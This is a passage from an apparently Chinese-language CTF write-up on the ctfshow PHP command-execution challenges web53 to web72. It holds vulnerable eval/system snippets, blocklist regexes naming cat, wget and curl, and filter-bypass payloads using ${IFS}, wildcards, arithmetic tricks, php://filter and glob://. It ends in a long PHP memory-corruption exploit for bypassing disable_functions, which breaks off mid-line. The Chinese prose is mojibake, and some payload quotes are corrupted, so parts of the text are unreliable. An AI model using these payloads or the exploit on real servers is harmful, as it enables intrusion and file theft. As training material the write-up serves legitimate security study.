class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;no&#x27;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>Payload:</p><blockquote><p>1ã€?c&#x3D;taâ€™â€™c${IFS}fâ€™â€™lag.php</p><p>2ã€sâ€™â€™ort${IFS}f???????%0a</p></blockquote><h4 id="web54"><a href="#web54" class="headerlink" title="web54"></a>web54</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>Payload:</p><blockquote><p>1ã€?c&#x3D;&#x2F;bin&#x2F;?at${IFS}f???????</p><p>2ã€mv flag.php t.txt</p></blockquote><h4 id="web55-æ— æ•°å­—å­—æ¯çš„å‘½ä»¤æ‰§è¡Œ"><a href="#web55-æ— æ•°å­—å­—æ¯çš„å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="web55(æ— æ•°å­—å­—æ¯çš„å‘½ä»¤æ‰§è¡Œ)"></a>web55(æ— æ•°å­—å­—æ¯çš„å‘½ä»¤æ‰§è¡Œ)</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>)</span><br></pre></td></tr></table></figure><p>è¿‡æ»¤äº†æ‰€æœ‰å­—æ¯</p><p><img src="web55.png" loading="lazy"></p><p>åˆ©ç”¨postä¸Šä¼ æ–‡ä»¶ï¼Œç„¶åä½¿ç”¨.(source)æ‰§è¡Œï¼Œä¸€èˆ¬ä¸Šä¼ åæ–‡ä»¶åœ¨&#x2F;tmp&#x2F;php?????[@-[]</p><p><img src="web55_2.png" loading="lazy"></p><p>[å‚è€ƒæ–‡ç« ]: <a href="https://blog.csdn.net/qq_46091464/article/details/108513145">https://blog.csdn.net/qq_46091464/article/details/108513145</a>â€œæ— å­—æ¯æ•°å­—çš„å‘½ä»¤æ‰§è¡Œâ€</p><h4 id="web56"><a href="#web56" class="headerlink" title="web56"></a>web56</h4><p>æ–¹æ³•åŒä¸Š</p><h4 id="web57-å–å"><a href="#web57-å–å" class="headerlink" title="web57(å–å)"></a>web57(å–å)</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//flag in 36.php </span></span><br><span class="line"><span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|[a-z]|[0-9]|\`|\|\#|\&#x27;|\&quot;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;</span>, <span class="variable">$c</span>)</span><br></pre></td></tr></table></figure><p>è¿‡æ»¤äº†å­—æ¯æ•°å­—</p><p>é€šè¿‡<code>$(())</code>æ“ä½œæ„é€ å‡º36ï¼š <code>$(())</code> ï¼šä»£è¡¨åšä¸€æ¬¡è¿ç®—ï¼Œå› ä¸ºé‡Œé¢ä¸ºç©ºï¼Œä¹Ÿè¡¨ç¤ºå€¼ä¸º0</p><p><code>$(( ~$(()) )) </code>ï¼šå¯¹0ä½œå–åè¿ç®—ï¼Œå€¼ä¸º-1</p><p><code>$(( $((~$(()))) $((~$(()))) ))</code>ï¼š -1-1ï¼Œä¹Ÿå°±æ˜¯(-1)+(-1)ä¸º-2ï¼Œæ‰€ä»¥å€¼ä¸º-2</p><p><code>$(( ~$(( $((~$(()))) $((~$(()))) )) )) </code>ï¼šå†å¯¹-2åšä¸€æ¬¡å–åå¾—åˆ°1ï¼Œæ‰€ä»¥å€¼ä¸º1</p><p>æ•…æˆ‘ä»¬åœ¨<code>$(( ~$(( )) ))</code>é‡Œé¢æ”¾37ä¸ª<code>$((~$(())))</code>ï¼Œå¾—åˆ°-37ï¼Œå–åå³å¯å¾—åˆ°36</p><p>Payload:</p><blockquote><p>?c&#x3D;$((<del>$(($((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))))))</p></blockquote><h4 id="web58"><a href="#web58" class="headerlink" title="web58"></a>web58</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Payload:</p><blockquote><p>1ã€c&#x3D;show_source(â€˜flag.phpâ€™);</p><p>2ã€c&#x3D;highlight_file(â€œflag.phpâ€);</p><p>3ã€c&#x3D;include($_POST[â€˜wâ€™]);&amp;w&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</p><p>4ã€c&#x3D;include(â€œflag.phpâ€);var_dump(get_defined_vars());</p></blockquote><h4 id="web59"><a href="#web59" class="headerlink" title="web59"></a>web59</h4><p>PayloadåŒä¸Š</p><h4 id="web60"><a href="#web60" class="headerlink" title="web60"></a>web60</h4><p>PayloadåŒä¸Š</p><h4 id="web61"><a href="#web61" class="headerlink" title="web61"></a>web61</h4><p>PayloadåŒä¸Š</p><h4 id="web62"><a href="#web62" class="headerlink" title="web62"></a>web62</h4><p>PayloadåŒä¸Šï¼Œä¸è¿‡banäº†highlight_fileå‡½æ•°</p><h4 id="web63"><a href="#web63" class="headerlink" title="web63"></a>web63</h4><p>PayloadåŒä¸Š</p><h4 id="web64"><a href="#web64" class="headerlink" title="web64"></a>web64</h4><p>PayloadåŒä¸Š</p><h4 id="web65"><a href="#web65" class="headerlink" title="web65"></a>web65</h4><p>banäº†show_source,ç„¶åä½¿ç”¨phpä¼ªåè®®è¯»å–flag.phpæ—¶ï¼Œæºç æ˜¾ç¤ºflagä¸åœ¨è¿™ï¼Œäºæ˜¯ä½¿ç”¨dataåè®®è¯»å–æ ¹ç›®å½•çœ‹åˆ°flag.txt</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;/&#x27;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="web65.png" loading="lazy"></p><p>å› ä¸ºå¤§éƒ¨åˆ†ç›´æ¥å¯ä»¥å‘½ä»¤æ‰§è¡Œçš„å‡½æ•°è¢«banäº†ï¼Œçœ‹äº†wpæ²¡æƒ³åˆ°highlight_fileæ²¡è¢«ban</p><h4 id="web66"><a href="#web66" class="headerlink" title="web66"></a>web66</h4><p>PayloadåŒä¸Š</p><h4 id="web67"><a href="#web67" class="headerlink" title="web67"></a>web67</h4><p>highlight_fileè¢«banäº†ï¼Œä½†æ˜¯å¯ä»¥ç›´æ¥ç”¨phpä¼ªåè®®è¯»å–</p><h4 id="web68"><a href="#web68" class="headerlink" title="web68"></a>web68</h4><p>PayloadåŒä¸Š</p><p>implodeï¼šæŠŠæ•°ç»„å…ƒç´ ç»„åˆä¸ºå­—ç¬¦ä¸²</p><p>å†·é—¨å‡½æ•°ï¼šè¯»å–å‡½æ•°readgzfileï¼šå¯ä»¥è¯»å–égzæ ¼å¼çš„æ–‡ä»¶</p><p>Payloadï¼š</p><blockquote><p>1ã€?c&#x3D;echo(implode(â€˜â€”â€˜,scandir(â€œ&#x2F;â€œ)));</p><p>2ã€?c&#x3D;readgzfile(â€˜&#x2F;flag.txtâ€™);</p></blockquote><h4 id="web69"><a href="#web69" class="headerlink" title="web69"></a>web69</h4><p>è™½ç„¶æœ‰å‡ ä¸ªæŠ¥é”™ä½†æ˜¯flagè¿˜æ˜¯å‡ºæ¥äº†</p><h4 id="web70"><a href="#web70" class="headerlink" title="web70"></a>web70</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$s</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">        <span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è™½ç„¶phpä¼ªåè®®å¯ä»¥è¯»ï¼Œä½†æ˜¯ç»“æœæŠŠæ•°å­—å­—æ¯æ›¿æ¢äº†ï¼Œä½†æ˜¯å¯ä»¥æ‰§è¡Œphpä»£ç è®©åé¢çš„åŒ¹é…ç¼“å†²åŒºä¸æ‰§è¡Œç›´æ¥é€€å‡ºexitæˆ–die</p><p>Payload:</p><blockquote><p>c&#x3D;readgzfile(â€˜&#x2F;flag.txtâ€™);exit(0);</p><p>c&#x3D;include(â€˜&#x2F;flag.txtâ€™);exit(0);</p></blockquote><h4 id="web71"><a href="#web71" class="headerlink" title="web71"></a>web71</h4><p>PayloadåŒä¸Š</p><h4 id="web72-globåè®®-wafç»•è¿‡"><a href="#web72-globåè®®-wafç»•è¿‡" class="headerlink" title="web72(globåè®®+wafç»•è¿‡)"></a>web72(globåè®®+wafç»•è¿‡)</h4><p>flagä¸åœ¨&#x2F;ä¸‹äº†ï¼Œä½†æ˜¯å¾ˆå¤šæŸ¥è¯¢çš„å‡½æ•°è¢«banäº†</p><p>ä½¿ç”¨glob:&#x2F;&#x2F;ä¼ªåè®®ç»•è¿‡open_basedir</p><p>globå¯ä»¥éå†ç›®å½•ï¼Œå¹¶ä¸”ä¸å—disable_functionsçš„é™åˆ¶ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="meta">?&gt;</span><span class="meta">&lt;?php</span> <span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob://./*&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)</span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä»”ç»†çœ‹çœ‹è¿™ä¸ªä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);  </span><br><span class="line"><span class="comment"># åˆ©ç”¨DirectoryIterator($path)å¯ä»¥å®ç°éå†ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶</span></span><br><span class="line"><span class="comment"># glob:// â€” æŸ¥æ‰¾åŒ¹é…çš„æ–‡ä»¶è·¯å¾„æ¨¡å¼</span></span><br><span class="line"><span class="comment"># DirectoryIterator(&quot;glob:///*&quot;)   éå†æ ¹ç›®å½•é‡Œæ‰€æœ‰æ–‡ä»¶</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)  <span class="comment">#å¾ªç¯éå†è¾“å‡ºï¼Œå¹¶ä»¥ç©ºæ ¼ä¸ºåˆ†éš”</span></span><br><span class="line">&#123;<span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å…¶å®ä¸åŠ å‰é¢<code>?&gt;&lt;?php</code>ä¹Ÿæ˜¯å¯ä»¥çš„ã€‚evalé‡Œçš„è¯­å¥å¯ä»¥è§†ä¸ºåœ¨å½“å‰phpæ–‡ä»¶é‡ŒåŠ äº†å‡ æ¡è¯­å¥ï¼Œè¿™äº›è¯­å¥å¿…é¡»æ˜¯å®Œæ•´çš„ï¼Œå³å¿…é¡»ä»¥<code>;</code>æˆ–è€…<code>?&gt;</code>ç»“å°¾æ¥ç»“æŸè¯­å¥ï¼Œä½†æ˜¯evalé‡Œçš„?&gt;ä¸ä¼šé—­åˆå½“å‰çš„phpæ–‡ä»¶ï¼Œæ‰€ä»¥å½“å‰phpé¡µé¢åç»­çš„è¯­å¥éƒ½æ˜¯ä¼šæ‰§è¡Œçš„ã€‚</p><p>å¯ä»¥çœ‹ä¸€ä¸‹ä¸‹é¢çš„å›¾ç‰‡ï¼Œevalé‡Œçš„è¯­å¥å¯ä»¥ä¿®æ”¹æ–‡ä»¶çš„å˜é‡å€¼ï¼Œä½†æ˜¯<code>?&gt;</code>å¹¶ä¸ä¼šé—­åˆå¤–é¢çš„PHPè¯­å¥ã€‚<br><img src="web72.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="function"><span class="keyword">function</span> <span class="title">ctfshow</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123; <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>, <span class="variable">$backtrace</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Vuln</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$backtrace</span>; </span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">        <span class="variable">$backtrace</span> = (<span class="keyword">new</span> <span class="built_in">Exception</span>)-&gt;<span class="title function_ invoke__">getTrace</span>();</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>])) &#123;</span><br><span class="line">            <span class="variable">$backtrace</span> = <span class="title function_ invoke__">debug_backtrace</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>, <span class="variable">$d</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span>-<span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line">        <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">        <span class="variable">$address</span> |= <span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$m</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$out</span> .= <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>));</span><br><span class="line">        <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$v</span> &amp; <span class="number">0xff</span>));</span><br><span class="line">        <span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x68</span>, <span class="variable">$addr</span> + <span class="variable">$p</span> - <span class="number">0x10</span>);</span><br><span class="line">    <span class="variable">$leak</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$helper</span>-&gt;a);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$s</span> != <span class="number">8</span>) &#123; <span class="variable">$leak</span> %= <span class="number">2</span> &lt;&lt; (<span class="variable">$s</span> * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params"><span class="variable">$base</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$e_type</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$e_phoff</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x20</span>);</span><br><span class="line">    <span class="variable">$e_phentsize</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="variable">$e_phnum</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line">        <span class="variable">$p_type</span>  = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">        <span class="variable">$p_flags</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">        <span class="variable">$p_vaddr</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x10</span>);</span><br><span class="line">        <span class="variable">$p_memsz</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">6</span>) &#123; </span><br><span class="line"></span><br><span class="line">            <span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == <span class="number">2</span> ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line">            <span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">5</span>) &#123; </span><br><span class="line">            <span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$base</span>, <span class="variable">$elf</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">list</span>(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, <span 